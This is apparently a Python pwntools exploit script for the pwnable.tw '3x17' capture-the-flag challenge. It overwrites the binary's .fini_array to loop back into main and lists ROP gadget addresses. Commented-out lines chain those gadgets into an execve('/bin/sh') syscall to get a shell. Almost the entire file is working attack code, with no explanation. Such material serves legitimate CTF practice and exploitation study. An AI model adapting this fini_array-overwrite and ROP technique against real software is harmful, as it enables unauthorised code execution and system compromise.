from pwn import *

p = process("./3x17")
#p = remote("chall.pwnable.tw", 10105)
raw_input("DEBUG")

fini_array_section = 0x4b40f0
fini_array_caller = 0x402960
main = 0x401b6d
pop_rdi = 0x0000000000401696
pop_rsi = 0x0000000000406c30
pop_rdx = 0x0000000000446e35
pop_rax = 0x000000000041e4af
syscall = 0x00000000004022b4
leave_ret = 0x0000000000401c4b
bin_sh  = fini_array_section + 8*11

def send(addr, data):
	p.sendlineafter(b"addr:", str(addr))
	p.sendafter(b"data:",data)


send(fini_array_section, p64(fini_array_caller)+p64(main))
#send(fini_array_section+8*2, p64(pop_rdi) + p64(bin_sh))
#send(fini_array_section+8*4, p64(pop_rsi) + p64(0))
#send(fini_array_section+8*6, p64(pop_rdx) + p64(0))
#send(fini_array_section+8*8, p64(pop_rax) + p64(0x3b))
#send(fini_array_section+8*10,p64(syscall) + b"/bin/sh\x00")
#send(fini_array_section, p64(leave_ret))	


p.interactive()
